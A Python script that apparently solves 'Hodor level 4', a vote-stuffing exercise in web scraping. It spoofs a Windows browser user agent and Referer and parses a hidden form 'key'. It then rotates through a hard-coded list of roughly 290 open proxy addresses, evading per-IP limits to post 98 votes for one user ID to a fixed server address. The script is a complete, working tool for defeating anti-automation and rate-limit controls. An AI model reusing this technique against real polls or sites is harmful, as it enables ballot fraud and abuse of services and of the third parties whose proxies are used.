#!/usr/bin/python3
'''
Module for Hodor level 4 challenge.

Has to have a WINDOW's user agent.

Has to use a proxy list to spoof/rotate ip.

Has to parse the hidden 'key' field's 'value' from a GET request

Has to add the user's 'id' and 'holdthedoor' fields to POST request.

'''
import requests
import re
import time

url = 'http://158.69.76.135/level4.php'
data = {'id': '650', 'holdthedoor': 'Submit'}
referer = url
agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
(KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
headers = {'User-Agent': agent, 'Referer': url}

plist = ["1.20.100.227:57396",
         "188.243.62.147:49899",
         "80.240.252.237:54201",
         "79.191.5.184:8080",
         "188.227.49.101:60075",
         "188.225.179.98:43416",
         "176.123.164.240:58488",
         "91.205.146.25:37501",
         "185.103.88.13:53281",
         "82.114.241.138:8080",
         "188.26.3.152:35478",
         "200.89.99.30:53924",
         "46.151.252.157:53281",
         "124.41.196.13:30926",
         "88.255.102.116:23500",
         "36.89.244.151:42797",
         "193.68.17.46:32413",
         "200.53.221.25:60138",
         "176.98.76.203:43549",
         "217.174.179.182:37497",
         "103.229.177.51:34210",
         "111.68.31.134:50838",
         "125.24.156.252:34986",
         "37.120.21.137:60223",
         "182.53.197.87:33952",
         "181.129.50.138:34992",
         "103.115.128.6:51492",
         "170.81.247.47:3128",
         "95.87.127.133:39645",
         "150.242.252.66:39381",
         "109.72.10.83:51973",
         "145.239.169.46:1080",
         "134.209.170.22:3128",
         "3.0.213.95:3128",
         "181.129.50.162:41825",
         "177.46.147.89:57803",
         "181.115.168.3:60195",
         "177.75.143.198:58351",
         "89.140.169.24:30390",
         "221.126.249.99:8080",
         "195.112.197.210:58740",
         "217.210.157.135:37195",
         "91.192.4.26:8080",
         "41.217.219.53:43699",
         "187.111.192.142:60053",
         "203.145.179.170:50896",
         "103.28.243.11:41494",
         "81.163.54.56:41258",
         "77.48.137.65:49878",
         "128.199.98.232:3128",
         "191.241.166.17:41288",
         "36.67.42.39:52151",
         "221.120.162.215:35345",
         "191.102.93.82:8181",
         "187.190.9.80:41860",
         "89.109.8.160:21231",
         "95.107.53.236:40508",
         "24.226.159.195:39030",
         "185.82.212.95:8080",
         "117.240.59.115:36127",
         "103.250.158.227:23500",
         "177.130.58.157:53557",
         "94.230.158.1:36625",
         "92.245.114.118:35866",
         "77.77.17.48:31807",
         "193.160.226.89:53186",
         "72.139.29.114:51306",
         "94.180.108.102:54022",
         "31.163.192.38:55491",
         "113.130.126.212:57069",
         "46.229.206.135:54970",
         "93.177.150.112:40343",
         "212.50.85.39:60243",
         "41.217.219.61:41494",
         "117.54.250.2:60695",
         "103.106.34.1:49714",
         "110.172.140.57:63141",
         "103.253.113.23:44737",
         "101.109.143.71:36127",
         "95.0.226.84:33229",
         "1.179.157.237:46178",
         "187.33.79.61:33469",
         "181.113.123.98:36494",
         "175.139.179.65:54980",
         "185.16.105.204:53281",
         "213.6.101.174:23500",
         "203.113.119.226:35468",
         "45.77.18.204:3128",
         "138.36.107.31:45319",
         "202.57.55.194:61811",
         "95.170.220.172:57114",
         "124.105.97.166:49910",
         "79.134.4.188:59011",
         "187.243.253.182:33796",
         "132.255.89.224:42448",
         "213.74.123.103:31171",
         "187.111.160.29:40098",
         "103.63.158.89:33488",
         "201.158.60.26:49392",
         "200.33.143.75:49346",
         "186.249.215.241:45702",
         "77.48.22.59:53838",
         "36.67.42.39:52151",
         "221.120.162.215:35345",
         "36.89.244.151:42797",
         "191.102.93.82:8181",
         "187.190.9.80:41860",
         "125.24.156.252:34986",
         "89.109.8.160:21231",
         "181.129.50.138:34992",
         "95.107.53.236:40508",
         "109.72.10.83:51973",
         "134.209.170.22:3128",
         "24.226.159.195:39030",
         "3.0.213.95:3128",
         "181.115.168.3:60195",
         "185.82.212.95:8080",
         "117.240.59.115:36127",
         "103.250.158.227:23500",
         "177.130.58.157:53557",
         "94.230.158.1:36625",
         "92.245.114.118:35866",
         "77.77.17.48:31807",
         "193.160.226.89:53186",
         "72.139.29.114:51306",
         "94.180.108.102:54022",
         "31.163.192.38:55491",
         "113.130.126.212:57069",
         "46.229.206.135:54970",
         "93.177.150.112:40343",
         "212.50.85.39:60243",
         "41.217.219.61:41494",
         "117.54.250.2:60695",
         "103.106.34.1:49714",
         "110.172.140.57:63141",
         "170.81.247.47:3128",
         "103.253.113.23:44737",
         "101.109.143.71:36127",
         "95.0.226.84:33229",
         "1.179.157.237:46178",
         "89.140.169.24:30390",
         "187.33.79.61:33469",
         "181.113.123.98:36494",
         "175.139.179.65:54980",
         "185.16.105.204:53281",
         "213.6.101.174:23500",
         "203.113.119.226:35468",
         "45.77.18.204:3128",
         "138.36.107.31:45319",
         "202.57.55.194:61811",
         "95.170.220.172:57114",
         "124.105.97.166:49910",
         "79.134.4.188:59011",
         "187.243.253.182:33796",
         "132.255.89.224:42448",
         "213.74.123.103:31171",
         "187.111.160.29:40098",
         "103.63.158.89:33488",
         "201.158.60.26:49392",
         "200.33.143.75:49346",
         "186.249.215.241:45702",
         "77.48.22.59:53838",
         "180.183.152.3:8080",
         "83.234.206.165:38092",
         "94.136.157.121:46193",
         "104.236.55.48:8080",
         "103.73.224.74:31147",
         "185.91.168.162:38524",
         "83.220.241.153:37071",
         "119.15.82.222:45267",
         "85.193.229.6:33982",
         "103.107.179.225:44249",
         "45.120.116.141:45019",
         "93.77.121.45:46980",
         "213.100.168.84:32245",
         "77.36.64.220:3129",
         "179.124.240.199:37758",
         "87.121.49.250:53281",
         "109.111.137.90:53281",
         "185.132.178.203:8080",
         "195.78.93.28:3128",
         "195.222.104.157:51423",
         "117.102.94.148:54511",
         "212.96.184.209:50618",
         "68.177.71.127:35635",
         "175.106.17.98:80",
         "45.221.79.134:53281",
         "101.255.56.201:36501",
         "31.13.227.67:56706",
         "103.41.28.130:54437",
         "202.184.51.231:53281",
         "109.69.1.16:45827",
         "212.233.232.54:32231",
         "94.228.21.66:61029",
         "1.10.187.61:34783",
         "45.70.60.66:33079",
         "171.100.204.146:35929",
         "176.113.126.127:39539",
         "182.53.96.215:50569",
         "185.132.179.109:8080",
         "54.38.110.35:47640",
         "170.81.35.22:59249",
         "86.57.159.118:61113",
         "75.98.119.13:30598",
         "105.112.83.35:58834",
         "109.86.225.33:41336",
         "90.170.205.178:33680",
         "118.173.232.43:53586",
         "77.36.64.221:3129",
         "103.231.242.242:80",
         "88.86.94.91:31698",
         "83.167.73.151:35445",
         "170.81.108.142:50659",
         "169.255.225.9:56759",
         "196.0.109.146:31116",
         "101.109.255.243:35084",
         "118.174.220.131:56183",
         "95.158.137.254:57477",
         "92.241.12.132:48694",
         "190.109.167.98:60273",
         "118.174.220.101:58164",
         "103.203.173.149:55622",
         "119.82.253.206:61051",
         "200.53.221.25:60138",
         "45.120.119.202:54179",
         "176.98.76.203:43549",
         "118.172.201.118:54351",
         "217.174.179.182:37497",
         "103.229.177.51:34210",
         "95.181.37.114:52165",
         "103.76.188.85:42612",
         "111.68.31.134:50838",
         "37.120.21.137:60223",
         "182.53.197.87:33952",
         "143.0.52.170:41216",
         "103.115.128.6:51492",
         "95.87.127.133:39645",
         "150.242.252.66:39381",
         "3.0.213.95:3128",
         "181.129.50.162:41825",
         "177.75.143.198:58351",
         "36.89.242.130:50560",
         "191.36.153.228:41705",
         "5.32.175.66:23500",
         "155.0.181.254:57722",
         "72.38.188.134:51011",
         "124.41.211.196:32541",
         "52.174.237.51:8080",
         "181.10.238.7:34931",
         "118.174.65.170:59783",
         "188.235.138.182:34467",
         "138.118.225.121:35562",
         "1.20.103.252:32143",
         "93.77.115.167:43814",
         "116.90.229.186:32506",
         "45.4.237.72:33847",
         "95.67.47.94:53281",
         "187.60.161.75:8081",
         "176.98.75.229:54256",
         "86.57.181.122:51910"]

success = 'Hold the Door challenge - Level 4'
votes = 98
ok = 0
fail = 0
s = requests.Session()
s.headers.update(headers)

for i, e in enumerate(plist):
    try:
        response = s.get(url, headers=headers)
        if response.status_code is not 200:
            continue
        matches = re.findall("value=\"([^\"]+)\"",
                             response.text)
        if not len(matches):
            continue

        data["key"] = matches[0]
        # print(data)
        response = s.post(url, data=data,
                          proxies={"http": "http://" + e}, timeout=5)
        # print(response.text)
        if response.status_code is 200 and success in response.text:
            fail = 0
            ok += 1
            print("{} ok!".format(ok))
    except Exception as e:
        print(e)
        fail += 1
    finally:
        if ok >= votes or fail >= 100:
            break

print("Finished: {}/{} votes.".format(ok, votes))
